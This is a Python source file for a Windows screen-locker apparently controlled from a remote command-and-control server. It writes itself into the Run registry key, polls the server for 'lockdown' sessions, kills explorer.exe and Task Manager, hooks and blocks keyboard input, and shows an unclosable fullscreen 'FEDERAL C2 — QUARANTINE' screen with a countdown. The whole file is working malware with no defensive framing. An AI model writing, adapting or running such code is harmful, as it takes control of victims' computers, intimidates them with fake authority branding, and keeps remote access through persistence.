import ctypes
import json
import os
import random
import subprocess
import sys
import time
import tkinter as tk
import winsound
import winreg
import requests

# 👉 YOUR PERMANENT RENDER C2 SERVER URL
CLOUD_SERVER_URL = "https://test-uukm.onrender.com/"

def make_persistent():
    """Adds the script to Windows Startup Registry to make it reboot-proof"""
    if os.name == "nt":
        try:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            script_path = os.path.abspath(sys.argv[0])
            python_executable = sys.executable
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "OSGuardC2Daemon", 0, winreg.REG_SZ, f'"{python_executable}" "{script_path}"')
        except Exception as e:
            pass

# Windows Hook Constants for Low-Level Keyboard Interception
WH_KEYBOARD_LL = 13
hook_id = None

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_ulong),
        ("scanCode", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode >= 0:
        return 1  # Block keyboard input
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
hook_callback = CMPFUNC(low_level_keyboard_proc)

def install_keyboard_hook():
    global hook_id
    if os.name == "nt" and not hook_id:
        hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
        hook_id = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, hInstance, 0)

def remove_keyboard_hook():
    global hook_id
    if os.name == "nt" and hook_id:
        ctypes.windll.user32.UnhookWindowsHookEx(hook_id)
        hook_id = None


class C2EndpointAgent:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()  # Start completely hidden as a background daemon
        
        self.is_locked = False
        self.active_session_id = None
        self.unlock_code = "unlock500"
        self.secret_buffer = ""
        self.attempt_count = 0
        self.start_time = 0
        
        # UI Elements references
        self.lock_window = None
        self.timer_lbl = None
        self.attempt_lbl = None

        # Start main thread polling loop
        self.poll_c2_server()
        
        self.root.mainloop()

    def poll_c2_server(self):
        """Polls Render C2 backend every 2 seconds safely on the main thread"""
        try:
            print("[*] Polling Render C2 server...")
            response = requests.get(f"{CLOUD_SERVER_URL}/api/sessions", timeout=5)
            if response.status_code == 200:
                sessions = response.json()
                for session in sessions:
                    if session['status'] == 'ACTIVE' and not self.is_locked:
                        print(f"🚨 LOCKDOWN TRIGGERED! Session: {session['session_id']}")
                        self.engage_lockdown(session['session_id'], session['reason'])
                        
                    elif session['status'] == 'DISARMED' and self.is_locked and session['session_id'] == self.active_session_id:
                        print(f"✅ REMOTE DISARM RECEIVED for {session['session_id']}")
                        self.disarm_lockdown(session['session_id'])
        except Exception as e:
            print(f"[-] Polling error: {e}")

        # Schedule the next poll in 2 seconds
        self.root.after(2000, self.poll_c2_server)

    def engage_lockdown(self, session_id, reason):
        self.is_locked = True
        self.active_session_id = session_id
        self.start_time = time.time()

        if os.name == "nt":
            subprocess.run("taskkill /F /IM explorer.exe", shell=True, capture_output=True)
            subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, capture_output=True)
            install_keyboard_hook()

        # Transform hidden root into fullscreen lockdown window
        self.lock_window = tk.Toplevel(self.root)
        self.lock_window.title("FEDERAL C2 — QUARANTINE")
        self.lock_window.attributes("-fullscreen", True)
        self.lock_window.attributes("-topmost", True)
        self.lock_window.configure(bg="#030305")
        self.lock_window.overrideredirect(True)

        self.lock_window.protocol("WM_DELETE_WINDOW", lambda: None)
        self.lock_window.bind("<Alt-F4>", lambda e: "break")
        self.lock_window.bind("<Escape>", lambda e: "break")
        self.lock_window.bind("<Control-Shift-Escape>", lambda e: "break")
        self.lock_window.bind("<Key>", self.on_key_press)

        frame = tk.Frame(self.lock_window, bg="#0d0d14", highlightbackground="#ff1744", highlightthickness=6, padx=40, pady=40)
        frame.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(frame, text="🚨 CLOUD C2 / ENDPOINT QUARANTINE ACTIVE 🚨", fg="#ff1744", bg="#0d0d14", font=("Consolas", 20, "bold")).pack(pady=(0, 10))
        
        info_msg = f"SESSION ID: {session_id}\nReason: {reason}\nConnected to Cloud C2. Awaiting Admin Authorization..."
        tk.Label(frame, text=info_msg, fg="#f1f5f9", bg="#0d0d14", font=("Consolas", 12), justify="center").pack(pady=(0, 15))

        self.timer_lbl = tk.Label(frame, text="15:00", fg="#ffffff", bg="#0d0d14", font=("Consolas", 48, "bold"))
        self.timer_lbl.pack()

        self.attempt_lbl = tk.Label(frame, text="SECURITY BYPASS ATTEMPTS BLOCKED: 0", fg="#ffd700", bg="#0d0d14", font=("Consolas", 12, "bold"))
        self.attempt_lbl.pack(pady=(15, 0))

        # Start local loops
        self.run_background_loops()

    def run_background_loops(self):
        if not self.is_locked:
            return

        # Task Manager Killer Guard
        if os.name == "nt":
            subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, capture_output=True)
            try:
                winsound.Beep(1200, 100)
            except Exception:
                pass

        # Update Countdown Timer
        elapsed = int(time.time() - self.start_time)
        remaining = max(0, 900 - elapsed)
        m, s = divmod(remaining, 60)
        if self.timer_lbl:
            self.timer_lbl.config(text=f"{m:02d}:{s:02d}")

        if remaining <= 0:
            self.disarm_lockdown(self.active_session_id)
        else:
            # Loop every 1 second
            self.root.after(1000, self.run_background_loops)

    def on_key_press(self, event):
        if event.char:
            self.secret_buffer = (self.secret_buffer + event.char.lower())[-9:]
            if self.secret_buffer == self.unlock_code:
                self.disarm_lockdown(self.active_session_id)
                return "break"

        self.attempt_count += 1
        if self.attempt_lbl:
            self.attempt_lbl.config(text=f"SECURITY BYPASS ATTEMPTS BLOCKED: {self.attempt_count}")
        return "break"

    def disarm_lockdown(self, session_id):
        if not self.is_locked:
            return

        self.is_locked = False
        remove_keyboard_hook()

        # Notify cloud server to mark resolved
        try:
            requests.get(f"{CLOUD_SERVER_URL}/api/lift-quarantine?session_id={session_id}", timeout=3)
        except Exception:
            pass

        if os.name == "nt":
            subprocess.Popen("explorer.exe", shell=True)

        if self.lock_window:
            try:
                self.lock_window.destroy()
            except Exception:
                pass
            self.lock_window = None


if __name__ == "__main__":
    make_persistent()
    C2EndpointAgent()
